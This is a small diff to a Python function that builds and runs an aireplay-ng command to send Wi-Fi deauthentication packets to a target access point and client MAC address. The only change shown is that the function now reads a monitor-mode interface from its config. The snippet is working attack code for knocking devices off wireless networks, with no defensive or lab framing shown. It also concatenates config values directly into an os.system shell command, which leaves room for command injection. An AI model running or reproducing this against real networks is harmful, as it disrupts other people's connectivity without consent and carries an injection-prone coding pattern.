@@ -38,7 +38,7 @@ def deauth(config):
 	#Aireplay command to send deauth packets
 	bssid = config['ap']['bssid']
 	target_mac = config['target']['mac']
-	nic = config['host']['nic']
+	nic = config['host']['monitor_nic']
 	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + nic
 	os.system(cmd)
 
